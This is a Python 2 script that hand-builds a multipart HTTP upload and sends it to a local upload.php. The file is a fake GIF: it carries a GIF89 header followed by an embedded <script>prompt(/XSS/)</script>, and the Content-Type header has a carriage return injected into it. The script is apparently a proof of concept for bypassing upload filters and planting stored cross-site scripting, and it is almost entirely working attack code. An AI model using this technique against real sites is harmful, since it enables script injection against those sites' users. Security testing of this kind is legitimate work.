#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
import sys
import socket
import ssl
import re


class FileSender:
    _fileName = 'test.gif'
    _fieldName = 'file'
    _fileType = 'image/jpeg\rany'

    def send(self, url, fileName=_fileName, fileType=_fileType, fieldName=_fieldName):
        uploadUriInfo = self.getUriInfo(url)
        fileContent = 'GIF89\r\n<html><script>prompt(/XSS/)</script></html>'
        body = [
            self._getMultipartFileData(fieldName, fileName, fileType, fileContent),
            '--' + self._getBoundary() + '--\r\n\r\n'
        ]
        bodyString = '\r\n'.join(body)

        request = 'POST %s HTTP/1.0\r\n' % uploadUriInfo['path']
        request += 'Host: %s\r\n' % uploadUriInfo['host']
        request += 'Content-Type: multipart/form-data; boundary=%s\r\n' % self._getBoundary()
        request += 'Content-Length: %d\r\n' % len(bodyString)
        request += '\r\n'
        request += '\r\n'
        request += bodyString

        return self._socketRequest(
            uploadUriInfo['scheme'],
            uploadUriInfo['host'],
            uploadUriInfo['port'],
            request
        )

    def getUriInfo(self, uri):
        p = '(?P<scheme>http.?)?(?:://)?(?P<host>[^:/ ]+):?(?P<port>[0-9]*)(?P<path>.*)'
        m = re.search(p, uri)
        scheme = m.group('scheme') if m.group('scheme') != '' else 'http'
        host = m.group('host')
        port = int(m.group('port')) if m.group('port') != '' else 443 if m.group('scheme') == 'https' else 80
        path = m.group('path') if m.group('path') != '' else '/'
        return {
            'scheme': scheme,
            'host': host,
            'port': port,
            'path': path
        }

    def _getSocketForScheme(self, scheme):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if scheme == 'https':
            return ssl.wrap_socket(sock)
        else:
            return sock

    def _socketRequest(self, scheme, host, port, payload):
        socket = self._getSocketForScheme(scheme)
        socket.connect((host, port))
        socket.sendall(payload)
        data = socket.recv(1024)
        socket.close()
        return data

    def _getBoundary(self):
        return '---------------------------435836722131556084433303325'

    def _getMultipartData(self, name, data):
        result = '--'
        result += self._getBoundary()
        result += '\r\n'
        result += 'Content-Disposition: form-data; name="%s"' % name
        result += '\r\n'
        result += '\r\n'
        result += data
        return result

    def _getMultipartFileData(self, name, fileName, contentType, content):
        result = '--'
        result += self._getBoundary()
        result += '\r\n'
        result += 'Content-Disposition: form-data; name="%s"; filename="%s"' % (name, fileName)
        result += '\r\n'
        result += 'Content-Type: %s' % contentType
        result += '\r\n'
        result += '\r\n'
        result += content
        return result


if __name__ == '__main__':
    response = FileSender().send(url='http://localhost/upload.php')
    print(response)
